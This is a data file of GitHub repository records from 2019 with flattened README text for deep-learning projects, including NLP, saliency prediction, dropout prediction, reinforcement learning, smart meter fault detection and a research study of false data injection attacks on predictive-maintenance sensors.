DhamuSniper,Natural-Language-Processing---Sequence-Data-world,n/a,Natural Language Processing Sequence Data world This repo is purely inspired from Andrew Ng s Coursera course called Deep learning specialization Natural Language Processing In this data world sequence data is one of the challenging thing to get processed But fortunately Deep neural networks helps us to process this data and ease the way to get valuable results Repository Author Info G DHAMODHARAN MSc Computer Science Anna University NLP has a wide range of applications like Speech Recognition Dialog Systems Sentiment Analysis Machine Translation Video Activity Recognition Name Entity Recognition Creation of Question and Answers with Distraction for MCQ based tests and Many more To learn NLP We must master RNN Recurrent Neural Networks I designed this repo something like this Thanks to Standford CheatSheet Basics Architecture structure Applications of RNNs Loss function Backpropagation Handling long term dependencies Common activation functions Vanishing exploding gradient Gradient clipping GRU LSTM Types of gates Bidirectional RNN Deep RNN Learning word representation Notations Embedding matrix Word2vec Skip gram Negative sampling GloVe Comparing words Cosine similarity t SNE Language model n gram Perplexity Machine translation Beam search Length normalization Error analysis Bleu score Attention Attention model Attention weights,2019-09-30T20:25:11Z,2019-11-08T06:04:43Z,Jupyter Notebook,DhamuSniper,User,1,1,0,21,master,DhamuSniper,1,0,0,0,0,0,0
deepraj1729,Astro-ML,n/a,Astro ML This a repository consisting my works in astronomy using Deep Learning,2019-09-24T22:08:27Z,2019-11-10T05:08:00Z,Jupyter Notebook,deepraj1729,User,1,1,0,61,master,deepraj1729,1,0,0,0,0,0,0
Marijoserm,TFG-Optica,deep-learning#deep-neural-networks#saliency-detection#saliency-prediction,Trabajo Fin de Grado MODELOS DE ATENCIN VISUAL MULTIESPECTRAL Y RGB BASADOS EN DEEP LEARNING Mara Jos Rueda Montes License CC BY NC SA 4 0 https img shields io badge License CC 20BY NC SA 204 0 lightgrey svg https creativecommons org licenses by nc sa 4 0 En el campo de la visin artificial una de las tareas de investigacin actuales es la prediccin de las fijaciones oculares en una escena Como consecuencia han surgido una gran variedad de modelos cuya finalidad es localizar las regiones de una imagen en las que existe una mayor predisposicin a orientar la mirada A estos modelos se les denomina modelos de saliencia o modelos de atencin visual y su empleo tiene mltiples aplicaciones como el reconocimiento de objetos segmentacin de imgenes evaluacin de la calidad de imagen sustraccin de fondo en anuncios etc En este Trabajo Fin de Grado TFG se van abordar los conocimientos bsicos y tiles para poder entender la estructura y el funcionamiento de los modelos de saliencia especialmente los que estn basados en deep learning como las redes neuronales convolucionales Tambin se van a exponer diferentes modelos de saliencia as como sus contribuciones distinguiendo entre los modelos que utilizan imgenes RGB y los modelos que usan imgenes multiespectrales o hiperespectrales El documento va a seguir la siguiente estructura comienza con la seccin 2 en la que se van a exponer los objetivos de este TFG En la seccin de conceptos y desarrollo 3 que es la ms extensa en el apartado sobre saliencia 3 1 se van abordar los conocimientos bsicos y tiles para poder entender el objetivo de los modelos basados en este concepto En el segundo apartado 3 2 se va a desarrollar un pequeo resumen de la aparicin en el tiempo de algunos de los modelos de saliencia dividindolos en cuanto al fundamento de sus estructuras El apartado 3 3 incluye una descripcin general del funcionamiento de las redes neuronales convolucionales Finalmente en el ltimo apartado de conceptos y desarrollo 3 4 se van a evaluar los modelos expuestos El documento continua con la seccin 4 en la que se van a aportar las conclusiones La seccin 5 y 6 de agradecimientos y referencias respectivamente y por ltimo la seccin 7 en la que aparece el glosario como anexo Key wordsSaliency prediction saliency object detection deep learning based models convolutional neural networks multiespectral hyperespectral,2019-10-22T21:00:17Z,2019-10-26T13:11:50Z,n/a,Marijoserm,User,1,1,1,9,master,Marijoserm,1,0,0,0,0,0,5
ask1a,cats_dogs,n/a,catsdogs reconnaissance d image de chien et chat avec la librairie de deep learning keras et tensorflow jeux de donne source dcompresser https www kaggle com c dogs vs cats data,2019-10-03T18:13:36Z,2019-10-08T14:29:33Z,Python,ask1a,User,1,1,0,5,master,ask1a,1,0,0,0,0,0,0
ayulockin,Thought-Experiments,n/a,Thought Experiments This repository will contain my thought experiments conducted in the field of Deep Learning 1 MeowandWoof https github com ayulockin Thought Experiments blob master MeowandWoof ipynb Uses 1D colvolution for audio classification of Cat and Dog Achieved 83 train and 75 val on basic architecture Nothing fancy I had this thing in my head going for sometime that 1D Conv like 2D conv can capture simplified feature in the initial layers Like for an image classification the initial layer usually end up being an edge detector So I thought the initial layer for 1D conv or audio classification will be some envelope like psd or hilbert or homomorphic And it turned out that it s true Nbviewer https nbviewer jupyter org github ayulockin Thought Experiments blob master MeowandWoof ipynb 2 DirectionCNNwithMNIST https github com ayulockin Thought Experiments blob master DirectionCNNwithMNIST ipynb A simple MNIST handwritten digit classifier The idea behind this notebook is to see what will happen if the input image is flipped upside down The flipping operation which changed the shape of the digit entirely is new data to the model And hence false prediction I think that even though initial layers extract simple features The features are highly dependent on the type of image it has seen A simple experiment like this showed that CNN rather Neural Network in itself does not capture the sense of direction This theory can be proved on images such as chess pieces which do not change the overall appearance of the image We humans too can classify a fliped 5 as 2 But certainly a king chess piece will be king even if we flip the image Is there a method that can capture this sense of direction Obviously if we label and consider this problem in a supervised setting it can be achieved How do humans get that the image is flipped and most of the times we recognize the image I do understand that we can easily overcome this issue by training the model with such examples Can I call this experiment a very poor demonstration of adversarial learning attack 3 Coming soon,2019-10-11T08:28:25Z,2019-11-03T12:05:15Z,Jupyter Notebook,ayulockin,User,1,1,0,7,master,ayulockin,1,0,0,0,0,0,0
vipulgote1999,practical-machine-learining-with-tensorflow,n/a,Welcome to Practical Machine Learning with TensorFlow 2 0 MOOC As the name suggests we will mainly focus on practical aspects of ML that involves writing code in Python with TensorFlow 2 0 API In every session we will review the concept from theory point of view and then jump straight into implementation We will be using Google Colab as a platform for coding these models We will mainly cover material from the following page https www tensorflow org beta I would strongly advise students to run the code and experience how the code works Once you get the basic idea of the concept and its implementation you can spend some time looking at the details of each function from TF RC 2 0 API We will learn how to use tf Keras and tf Estimator APIs for building models We will also learn to use tf Dataset API for building input pipelines for bringing data to ML models Later in the course we will learn how to build customized ML models and train them in distributed fashion Wish you a great journey of learning TensorFlow with us,2019-09-29T08:05:46Z,2019-11-17T09:22:13Z,Jupyter Notebook,vipulgote1999,User,1,1,0,7,master,vipulgote1999,1,0,0,0,0,0,0
matebaranyi1995,interpretable-dl,n/a,interpretable dl Big homework project by team InterpretableDL for the Deep Learning in Practice with Python and LUA VITMAV45 course of Budapest University of Technology and Economics 2019 fall Team members Marcell Nagy Mt Baranyi Tekla Kiss The detailed documentation of this project can be found here InterpretableDLdocumentation pdf Abstract The early identification of students at risk of dropout is of great interest and importance worldwide since early leaving of higher education is associated with considerable economic and social costs In Hungary and especially regarding STEM undergraduate programs the dropout rate is above the EU average In this work using advanced machine learning models such as deep neural networks and gradient boosted trees we aim to predict the final academic performance of students graduated or dropped out based on data that are available at the time of enrollment that were provided by the Central Academic Office of Budapest University of Technology and Economics In order to ensure that our uploaded dataset is anonymous we synthesize data with a Conditional Generative Adversarial Network Besides making predictions we also interpret our machine learning models with the help of state of the art techniques such as SHAP values The accuracy and AUC of the best performing deep learning model are 74 and 0 74 respectively That is quite remarkable compared to the 66 accuracy and 0 72 AUC scores of XGBoost Final updates Folders Milestone 1 2 are kept for historical reasons only Folder originalnotebooks contain our main notebooks but these are not executable since our real dataset is not uploadable Folder simulateddataandnotebooks contains a simulated dataset generated by CTGAN The notebooks in this folder are copies of the ones in the previous folder but these are exectuable on the simulated dataset for testing purposes irrelevant lines are deleted or commented out in these notebooks Some jupyter notebooks are also exported as HTMLs and can be found in this folder originalnotebooks htmls 20with 20the 20original 20outputs How to test the notebooks on the simulated data 1 Clone the repository 2 cd into the cloned folder 3 Build the image with the docker file docker build interpretable dl the docker file will copy the contents of the simulated folder so it is not neccessary to mount the folders of the cloned repo 4 Initialize a container docker run it rm p 8888 8888 interpretable dl 5 Run an ls to see the copied content 6 Start jupyter lab or notebook jupyter notebook no browser allow root ip 0 0 0 0 The workflow of this project workflow figures workflow png Interpretability A key issue and one of the hottest topics in machine learning nowadays is model interpretability and explainability especially if there are implications associated with the models prediction Molnar 2018 https christophm github io interpretable ml book in this project for model interpretation we use a state of the art technique namely SHAP SHapley Additive exPlanations values trumbelj Kononenko 2014 https link springer com article 10 1007 s10115 013 0679 x Lundberg Lee 2017 http papers nips cc paper 7062 a unified approach to interpreting model predictions pdf that is based on the game theoretical concept of Shapley value In this project we use the shap python module https github com slundberg shap for calculating the SHAP values and check out other baseline methods as well Data description To follow the rest of the project it is important to understand the education system in Hungary in particular the university admission process in this section we give a brief overview The following description is from this article https ieeexplore ieee org abstract document 8523888 In Hungary secondary education consists of 4 sometimes 5 years of schooling preceding 8 years of elementary education and followed by higher education Like several other countries a five point grading scale is used for grading where 1 is the failing grade and 5 corresponds to excellent At the end of the high school studies students take a centralized exit exam called rettsgi means maturity diploma or matura that consists of five exams of core subjects Mathematics Hungarian Language and Literature History a chosen Foreign Language and one subject of the students choice that they have been learning for at least 2 years The students can decide whether they take the exam of a subject at normal or at advanced level The admission to higher education in Hungary mostly rely on the secondary school performance of the students and in particular the results of their matura Students applying to colleges in Hungary gain a unversity enrtance score UES based on three factors grades in secondary school and matura results study points SP results of the maturity exams from two subjects required by the given university program matura points MP and extra points EP for additional achievements e g taking advanced level matura exams having certificate of a foreign language earning a prestigious place in sport art or academic competitions and equal opportunity points having disability disadvantage being on child care Every bachelor s program requires matura exams of specified subjects thus the aforementioned subject of students choice may depend on the desired program e g engineering bachelor programs usually require maths and a science subject There are two ways to calculate the university entrance score and the system automatically takes into account the one that is more advantageous for the student The first way is UES SP MP EP and the other is the doubling method UES 2 MP EP The composition of UES is as follows 1 Study points SP Two times the sum of the grades of the core subjects and a chosen science subject regarding the last two academic years when the subjects were studied At most 2 2 5 5 100 points The average results in percentage of the five matura exams At most 100 points 2 Matura points MP Sum of the results in percentage of two certain matura exams required by the bachelor s program At most 200 points 3 Extra points EP Advanced level matura exam 50 points per subject only if the subject is used for calculating matura points Certificate of foreign language a B2 certificate is worth 28 points while a C1 certificate is worth 40 points Equal opportunities disadvantaged background disability being on child care 40 points Higher level vocational training depending on the results it may be worth 32 20 or 10 points Prestigious place in sport art or academic competitions may be worth 10 100 points At most 100 extra points Before 2012 advanced level exams gave only 40 extra points and maximum additionally acquirable points were 80 and UES was at most 480 points can be gained The maximum acquirable admission point score hence is at most 500 points Each university defines a minimal university entrance score MUES to its programs and accepts those students whose UES are greater than the MUES of the desired program The admission program is based on the Gale Shapely matching algorithm Origin of the data The data have been provided by the Central Academic Office of Budapest University of Technology and Economics stored in the data warehouse of Neptun educational administration system We received anonymized data of undergraduate students enrolled between 2010 and 2018 regarding both their secondary school and university performance Due to an upgrade of the administration system in 2012 some data were not restored before that therefore we had to deal with a great amount of missing data Data privacy Due to the sensitive nature of our data we could not upload the original data sheets here hence one of our objectives was to generate an anonymous synthetic dataset that is somewhat similar to the original Our goal as to use a sophisticated method and Blint Gyires Tth suggested tying GANs Fortunately there are a few recently proposed GANs that are designed for anonymizing and modeling tabular data e g table GAN https github com mahmoodm2 tableGAN TGAN https github com DAI Lab TGAN and CTGAN https github com DAI Lab CTGAN In the final version of this project we used the CTGAN model,2019-10-02T17:20:17Z,2019-12-13T23:00:20Z,HTML,matebaranyi1995,User,1,1,0,63,master,marcessz#matebaranyi1995,2,0,0,0,0,0,0
osmanmusa,LAMP_python3,n/a,What is this This project contains scripts to reproduce experiments from the paper AMP Inspired Deep Networks for Sparse Linear Inverse Problems http ieeexplore ieee org document 7934066 by Mark Borgerding mailto borgerding 7 osu edu Phil mailto schniter 1 osu edu Schniter http www2 ece ohio state edu schniter and Sundeep Rangan http engineering nyu edu people sundeep rangan To appear in IEEE Transactions on Signal Processing See also the related preprint https arxiv org pdf 1612 01183 The Problem of Interest Briefly the Sparse Linear Inverse Problem is the estimation of an unknown signal from indirect noisy underdetermined measurements by exploiting the knowledge that the signal has many zeros We compare various iterative algorithmic approaches to this problem and explore how they benefit from loop unrolling and deep learning Overview The included scripts are generally written in python and require TensorFlow http www tensorflow org work best with a GPU generate synthetic data as needed are known to work with CentOS 7 Linux and TensorfFlow 1 1 are sometimes be written in octave matlab m files If you are just looking for an implementation of VAMP You might prefer the Matlab code in GAMP https sourceforge net projects gampmatlab code VAMP or the python code in Vampyre https github com GAMPTeam vampyre Description of Files saveproblem py saveproblem py Creates numpy archives npz and matlab mat files with y x A for the sparse linear problem y Ax w These files are not really necessary for any of the deep learning scripts which generate the problem on demand They are merely provided for better understanding the specific realizations used in the experiments istafistaamp m istafistaamp m Using the mat files created by saveproblem py this octave matlab script tests the performance of non learned algorithms ISTA FISTA and AMP e g octave 1 istafistaamp loaded Gaussian A problem AMP reached NMSE 35dB at iteration 25 AMP terminal NMSE 36 7304 dB FISTA reached NMSE 35dB at iteration 202 FISTA terminal NMSE 36 7415 dB ISTA reached NMSE 35dB at iteration 3420 ISTA terminal NMSE 36 7419 dB LISTA py LISTA py This is an example implementation of LISTA Learned Iterative Soft Thresholding Algorithm by Gregor LeCun 2010 ICML LAMP py LAMP py Example of Learned AMP LAMP with a variety of shrinkage functions LVAMP py LVAMP py Example of Learned Vector AMP LVAMP,2019-09-22T08:17:11Z,2019-11-17T17:06:11Z,Python,osmanmusa,User,1,1,0,7,master,peterjung73#osmanmusa,2,0,0,0,0,0,0
LuciaBaldassini,Grasping_Detection_System,n/a,Grasping Detection System Introduction This papers investigates several approaches for the detection of graspable areas of an object In particular two Resnet 50 and two ResNet 18 models are trained with different configurations 1 Pretrained ResNet 18 with a linear activation function 2 Pretrained ResNet 18 with a sigmoid activation function and re scaling of the labels and output vales 3 Pretrained ResNet 50 with a sigmoid activation function and re scaling of the labels and output vales 4 Non pretrained ResNet 50 with a sigmoid activation function and re scaling of the labels and output vales Dataset The models are trained on the Cornell Grasping Dataset which can be downloaded from http pr cs cornell edu grasping rectdata data php Results The result show that all model achieve an accuracy of around 90 Out of the four configurations the ones re scaling the labels and the output and using a sigmoid activation function models 2 3 and 4 resulted rectangles that are better suited for grasping in terms of orientation compared to model 1 which did not use such approach,2019-10-23T08:19:07Z,2019-11-15T13:50:31Z,Python,LuciaBaldassini,User,2,1,0,95,master,mrcabo#anpenta#LuciaBaldassini#ifeelgitty,4,0,0,0,0,0,6
ZSoumia,Continous-control-Agent,continuous-control#deep-learning#deep-reinforcement-learning#pytorch#reinforcement-learning-agent,Continuous control Agent 1 Project overview A reinforcement learning agent double jointed arm trained to maintain its position toward a target in a continuous environment 2 Task Description 2 1 Environement For this project I am using the Reacher https github com Unity Technologies ml agents blob master docs Learning Environment Examples md reacher environment which simulates Double jointed arm that can move to target locations With the observation has 30 variables about measurements such as velocities angular velocities of the arm The action space is 4 dimentional vector action x1 x2 x3 x4 where xi 1 1 with i 1 2 3 4 The rewarding strategy the agent receives 0 1 if it is in the goal target direction and nothing otherwise Thus the goal is to maintain the position of the arm toward the target for as many time steps as possible 2 2 Solving the environement This taks is considered solved if we reach an average reward of 30 0 over 100 episodes or more 3 Getting started If you wish to reproduce this work you need to setup the enviornement by following this section 3 1 Clone this repository git clone https github com ZSoumia Continous control Agent 3 2 Set up the environment Please follow instructions from this repo https github com udacity deep reinforcement learning dependencies 3 3 Download the Unity Environment Select the Unity environement based on your opertaing system Linux click here https s3 us west 1 amazonaws com udacity drlnd P2 Reacher oneagent ReacherLinux zip Mac OSX click here https s3 us west 1 amazonaws com udacity drlnd P2 Reacher oneagent Reacher app zip Windows 32 bit click here https s3 us west 1 amazonaws com udacity drlnd P2 Reacher oneagent ReacherWindowsx86 zip Windows 64 bit click here https s3 us west 1 amazonaws com udacity drlnd P2 Reacher oneagent ReacherWindowsx8664 zip Check out this https support microsoft com en us help 827218 how to determine whether a computer is running a 32 bit version or 64 link if you need help with determining if your computer is running a 32 bit version or 64 bit version of the Windows operating system For AWS If you d like to train the agent on AWS and have not enabled a virtual screen then please use this link https s3 us west 1 amazonaws com udacity drlnd P2 Reacher oneagent ReacherLinuxNoVis zip to obtain the headless version of the environment You will not be able to watch the agent without enabling a virtual screen but you will be able to train the agent To watch the agent you should follow the instructions to enable a virtual screen and then download the environment for the Linux operating system above Place the downloaded file into your cloned project file 4 Project s structure The Agent py file contains the general structure of the Reinforcement learning agent The Actor py contains the actor s network code Critic py contains the critic s network code Continuouscontrol ipynb is the notebook used to train and evaluate the agent Continuous control Report html is a report about the different aspects of this project,2019-11-01T23:34:46Z,2019-11-12T20:33:11Z,HTML,ZSoumia,User,1,1,0,6,master,ZSoumia,1,0,0,0,0,0,0
M-Almouie,GCP,n/a,GCP Documentation and resources for running Deep learning models on Google Cloud Platform GCP Following this document will ensure 1 Creation of necessary GCP resources https github com M Almouie GCP tree master GCPResourceCreation needed to run Deep learning projects on GCP 1 Configuration https github com M Almouie GCP tree master GCPSettingsConfiguration of certain GCP settings to facilitate a smooth process and safe process running these project 1 Deployment https github com M Almouie GCP tree master GCPDeployment of Deep learning projects model data etc to GCP 1 Execution https github com M Almouie GCP tree master GCPExecution of these projects on GCP and obtaining the desired output,2019-10-18T01:08:40Z,2019-11-01T00:43:15Z,n/a,M-Almouie,User,1,1,0,10,master,M-Almouie,1,0,0,0,0,0,1
mimrtl,PETMR_Workshop_DL_Bootcamp,n/a,PETMRWorkshopDLBootcamp Overview This git repository was used for a small Deep Learning Bootcamp that occured on 10 26 2019 at the SNMMI ISMRM PET MR Workshop in New York City https petmr2019 snmmi org This is based on a bootcamp run at the University of Wisconsin https github com kmjohnson3 ML4MIBootCamp 1 Getting access to the data Pre requisite A Google Acccount 1 Please complete the brief survey here https forms gle RjeWW82m1YgcdpF86 If you are doing this after October 26th 2019 you may need to email Alan to request access 2 You will be invited to the shared data PETMRWORKSHOPDLBOOTCAMPDATA 3 Next add this to your Google Drive by following these steps 1 Go to https drive google com 2 On the left click Shared with me 3 Click the folder PETMRWORKSHOPDLBOOTCAMPDATA 4 In the top right click Add to My Drive 5 Now you are ready 2 Running the bootcamp exercises This bootcamp will go through two simple hands on examples to develop a classification model and an image segmentation model Simply click on the links below to open the notebooks in Google CoLab For more information about CoLab go here https research google com colaboratory faq html 1 Exercise 1 MRI Sequence Type Detection Exercise 1 this notebook requires you to fill in missing parts https colab research google com github mimrtl PETMRWorkshopDLBootcamp blob master MRISequenceDetection ipynb Solution to Exercise 1 https colab research google com github mimrtl PETMRWorkshopDLBootcamp blob master MRISequenceDetectionSOLUTION ipynb 2 Exercise 2 CT Lung Segmentation Exercise 2 https colab research google com github mimrtl PETMRWorkshopDLBootcamp blob master LungSegmentationSOLUTION ipynb 3 Questions Please ask Alan if you have any questions or comments,2019-10-21T04:34:18Z,2019-10-27T18:42:42Z,Jupyter Notebook,mimrtl,Organization,0,1,0,47,master,abmcmillan,1,0,0,0,0,0,0
dependable-cps,FDIA-PdM,cnn#cyber-attack#cyber-physical-attacks#cybersecurity#deep-learning#false-data-injection#gru#industry-4#iot-security#iot-sensors#linear-regression#lstm#neural-network#predictive-analytics#predictive-maintenance#regression#remaining-useful-life#rul-prediction#sensor-fusion#turbofan-engine,False Data Injection Attacks in Internet of Things and Deep Learning enabled Predictive Analytics Introduction Industry 4 0 is the latest industrial revolution primarily merging automation with advanced manufacturing to reduce direct human effort and resources Predictive maintenance PdM is an industry 4 0 solution which facilitates predicting faults in a component or a system powered by state of the art machine learning ML algorithms especially deep learning algorithms and the Internet of Things IoT sensors However IoT sensors and deep learning DL algorithms both are known for their vulnerabilities to cyber attacks In the context of PdM systems such attacks can have catastrophic consequences as they are hard to detect due to the nature of the attack To date the majority of the published literature focuses on the accuracy of the IoT and DL enabled PdM systems and often ignores the effect of such attacks In this paper we demonstrate the effect of IoT sensor attacks in the form of false data injection attack on a PdM system At first we use three state of the art DL algorithms specifically Long Short Term Memory LSTM Gated Recurrent Unit GRU and Convolutional Neural Network CNN for predicting the Remaining Useful Life RUL of a turbofan engine using NASA s C MAPSS dataset Our obtained results show that the GRU based PdM model outperforms some of the recent literature on RUL prediction using the C MAPSS dataset Afterward we model and apply two different types of false data injection attacks FDIA specifically continuous and interim FDIAs on turbofan engine sensor data and evaluate their impact on CNN LSTM and GRU based PdM systems Our results demonstrate that attacks on even a small number of IoT sensors can strongly defect the RUL prediction in all cases However the GRU based PdM model performs better in terms of accuracy and FDIA resiliency Dataset To evaluate the performance of the CNN LSTM and GRU DL algorithms we use a well known dataset NASA s turbofan engine degradation simulation dataset C MAPSS Commercial Modular Aero Propulsion System Simulation This dataset includes 21 sensor data with different number of operating conditions and fault conditions In this dataset there are four sub datasets FD001 04 Every subset has training data and test data The test data has run to failure data from several engines of the same type Each row in test data is a time cycle which can be defined as an hour of operation A time cycle has 26 columns where the 1st column represents engine ID and the 2nd column represents the current operational cycle number The columns from 3 to 5 represent the three operational settings and columns from 6 26 represent the 21 sensor values The time series data terminates only when a fault is encountered DL algorithms for RUL prediction For this work we utilize LSTM GRU and CNN algorithms and compare their performance to an FDIA attack The Table I gives summary of all the hyperparameters used Table 2 gives summary of architectures of DL algorithms employed in this work and also RMSE comparision of LSTM CNN and GRU From Table II The notation GRU 100 100 100 lh 80 refers to a network that has 100 nodes in the hidden layers of the first GRU layer 100 nodes in the hidden layers of the second GRU layer 100 nodes in the hidden layers of the third GRU layer and a sequence length of 80 In the end there is a 1 dimensional output layer From Fig 3 and Table II it is evident that the DL algorithm GRU 100 100 100 with a sequence length 80 has the least RMSE of 7 26 It means that GRU is very accurate in predicting accurate RUL for this dataset FDIA signature To model the FDIA on sensors we add a vicious vector to the original vector which modifies the sensor output by a very small margin 0 01 to 0 05 for random FDIA and 0 02 for biased FDIA Here random FDIA means the noise added to the sensor output has a range 0 01 to 0 05 Whereas biased FDIA has a constant amount of noise added to the sensor output Fig 1 shows the comparison between the original and FDIA attacked output signal of sensor 2 for engine ID 3 for continuous FDIA In continuous FDIA we attack the sensor output from time cycles 130 to the end of life of the engine In the case of interim FDIA as shown in Fig 2 the attack duration is only for 20 time cycles 130 to 150 time cycles Note in the constrained attack the adversary has limited access to sensors As shown in Figure 1 and 2 the attack signature is very similar to the original signal making it stealthy and harder to detect even with common defense mechanisms in place Impact of FDIA on a PdM system The average degradation point of the engine is considered as 130 for the FD001 dataset and we assume that the Engine Health Monitoring EHM system of the aircraft sends 20 time cycles of data to the ground at a time The train and test dataset have 21 sensor data The FDIA can be performed on 21 sensors but to make the attack more realistic we perform FDIA on only 3 sensors specifically T24 T50 and P30 In FDIA continuous scenario the attacker has initiated the attacks after 130 time cycles one time cycle is equivalent of one flight hour and the attack duration is until end of life of the engine In FDIA interim scenario the attacker has initiated the attacks after 130 time cycles and the attack duration is 20 hours 20 time cycles Since the attack is initiated after 130 time cycles we only consider the engines which have data for more than 130 cycles which gives us 37 engines in the FD001 dataset It is evident from Fig 4 and 5 that LSTM GRU and CNN are greatly affected by the continuous and interim FDI attack In the case of random and biased FDIA random FDIA showed a considerable impact on all PdM models Piece wise RUL prediction To show the impact of FDIA attacks on a specific engine data we apply the piece wise RUL prediction The piece wise RUL prediction gives a better visual representation of degradation in an aircraft engine Figure 6 a shows an example of an engine data from the dataset of 100 engines and depicts the predicted RUL using GRU at each time step of that engine data From Figure 6 a it is evident that as the time series approaches the end of life the predicted RUL red line is close to the true RUL blue dashes because the DL model has more time series data to accurately predict the RUL Figure 6 and 7 gives piece wise RUL prediction after both continuous and interim FDIA Citation If this is useful for your work please cite our arXiv paper articlemode2019false title False Data Injection Attacks in Internet of Things and Deep Learning enabled Predictive Analytics author Mode Gautam Raj and Calyam Prasad and Hoque Khaza Anuarul journal arXiv preprint arXiv 1910 01716 year 2019,2019-10-29T06:11:31Z,2019-12-06T17:53:36Z,Python,dependable-cps,Organization,1,1,1,26,master,axndj1993#diner007,2,0,0,0,0,0,0
birdx0810,ChineseNLP,n/a,ChineseNLP A collective repository on Chinese Natural Language Processing using Deep Learning methods Chinese Word2Vec Model Reference gensim http zake7749 github io 2016 08 28 word2vec with gensim name time 2016 Code GitHub https github com zake7749 word2vec tutorial Prerequisite Jieba https github com fxsjy jieba OpenCC https github com BYVoid OpenCC Environment Python pip3 install gensim Corpus WikiDump https dumps wikimedia org zhwiki latest zhwiki latest pages articles xml bz2,2019-10-23T04:01:08Z,2019-10-29T09:24:31Z,Python,birdx0810,User,1,1,0,12,master,birdx0810,1,0,0,0,0,0,5
minoriwww,MeterDetection,n/a,Meter Detection Detecting malfunctional smart meters based on electricity usage and targeting them for replacement can save significant resources For this purpose we developed a novel deep learning method for malfunctional smart meter detection based on long short term memory LSTM and a modified convolutional neural network CNN Our method uses LSTM to predict the reading of a master meter based on data collected from submeters If the predicted value is significantly different from master meter reading data over a period of time the diagnosis part will be activated classifying every submeter to identify the malfunctional submeter based on CNN We propose a time series recurrence plot TS RP CNN by combining the sequential raw data of electricity and its recurrence plots in the phase space as dual input branches of CNN For more details please refer to the paper http arxiv org abs 1907 11377 If you are using our work in your research please cite us as ARTICLE2019arXiv190711377L author Liu Ming and Liu Dongpeng and Sun Guangyu and Zhao Yi and Wang Duolin and Liu Fangxing and Fang Xiang and He Qing and Xu Dong title Detection of Malfunctioning Smart Electricity Meter journal arXiv e prints keywords Electrical Engineering and Systems Science Signal Processing Computer Science Machine Learning Statistics Machine Learning year 2019 month Jul eid arXiv 1907 11377 pages arXiv 1907 11377 archivePrefix arXiv eprint 1907 11377 primaryClass eess SP adsurl https ui adsabs harvard edu abs 2019arXiv190711377L adsnote Provided by the SAO NASA Astrophysics Data System Getting Started These instructions will get you a copy of the project up and running on your local machine for development and testing purposes See deployment for notes on how to deploy the project on a live system Prerequisites Keras 2 2 tensorflow 1 9 Explanations for each file Data Our raw data is in fodler sitaiqu including the usage kilowatteveryday2year xlsx https github com minoriwww MeterDetection blob master sitaiqu kilowatteveryday2year xlsx the current electriccurrenthours2year xlsx https github com minoriwww MeterDetection blob master sitaiqu electriccurrenthours2year xlsx and the voltage voltagehours2year xlsx https github com minoriwww MeterDetection blob master sitaiqu voltagehours2year xlsx Data processing is accomplished in dataprocessing0 py https github com minoriwww MeterDetection blob master dataprocessing0 py Residential Areas Error Prediction Task input py https github com minoriwww MeterDetection blob master input py will generate the input for lstm morelstm py https github com minoriwww MeterDetection blob master morelstm py is used to compare the result in different sequence length Hence in order to exlude the contingency we choose to predict 10 times for each sequence length in klstm py https github com minoriwww MeterDetection blob master klstm py and drawklstm py https github com minoriwww MeterDetection blob master drawklstm py The comparision of classical methods is accomplished in svr py https github com minoriwww MeterDetection blob master svr py Malfunction injected Residential Area Detection Task We generated our data of residential area with malfunctional meters in bomb py https github com minoriwww MeterDetection blob master bomb py The detection task is finished in check py https github com minoriwww MeterDetection blob master check py Malfunctional Submeter Classification Task We generated our data in samples py https github com minoriwww MeterDetection blob master samples py which imported singlebombwave py https github com minoriwww MeterDetection blob master singlebombwave py and singleinputwave py https github com minoriwww MeterDetection blob master singleinputwave py The classification task is accomplished in combinemodel py https github com minoriwww MeterDetection blob master combinemodel py To test the performance of different proportions of malfunctional meters we did some comparision in changebomerate py https github com minoriwww MeterDetection blob master changebombrate py,2019-09-28T02:54:39Z,2019-11-13T01:03:43Z,Python,minoriwww,User,1,1,0,17,master,likeyhnbm#minoriwww,2,0,0,0,0,0,0
FSUHeting,DL_LOB_Trading_and_MidPirce_Movement,n/a,FSUDLLOBTrading Deep learning for limit order book trading and mid price movement Some data files are too big to upload If you want to run the code you need to download the dataset first There are two datasets in this project 1 LobsterData The data is on https lobsterdata com info DataSamples php Download the level 5 data of Amazon Apple Google Intel Microsoft 2 Benchmark dataset The data is on https etsin avointiede fi dataset urn nbn fi csc kata20170601153214969115 Click the Access this dataset freely to download the dataset Unzip the the data file if needed Put the files in the data folder without subfolders There are three experiments in this project More details about the models can be found on the paper Deep learning for Limit Order Book Trading and Mid price Movement prediction 1 limit order book trading We use two CNN models to predict bid ask spread cross One for long and one for short run maintrading py 2 mid pirce moving prediction on LobsterData We use a CNN model to predict the mid price movement run mainmidprice py 3 mid pirce moving prediction on Benchmark dataset We use a deep CNN model to predict the mid price movement run mainbenchmark py,2019-10-23T14:55:47Z,2019-11-21T19:13:56Z,Python,FSUHeting,User,1,1,0,22,master,FSUHeting,1,0,0,0,0,0,0
BounharAbdelaziz,Python-For-Data-Science,n/a,Python For Data Science A set of projects using Machine Learning and Deep Learning algorithms and technics to train models using Python librairies such as Scikit Learn Tensorflow Pandas Numpy Matplotlib,2019-09-23T13:10:07Z,2019-10-15T16:23:27Z,Jupyter Notebook,BounharAbdelaziz,User,1,1,0,11,master,BounharAbdelaziz,1,0,0,0,0,0,0
vothane,cortex,n/a,Cortex Cortex does not aim to bring practical extensible productive and performant deep learning to Elixir This for learning purposes only not for production IN PROGRESS Generative Adversarial Networks https 66 media tumblr com e36ab29c9357a7bc309fdc5971409aa7 tumblrokoovm5sRD1rzu2xzo4r1400 gif PLANNED Convolutional Neural Networks Recurrent Neural Networks https i imgur com yhPAgPK gif Issues and ToDo https user images githubusercontent com 256203 70104032 bb050400 1634 11ea 8469 7d48f8ae1c46 gif weights in XOR network sometimes do not converge and failed test Use Xavier initialization Tighten type inference scoping,2019-09-23T21:24:30Z,2019-12-04T01:30:50Z,Elixir,vothane,User,2,1,0,54,master,vothane,1,0,0,0,0,0,0
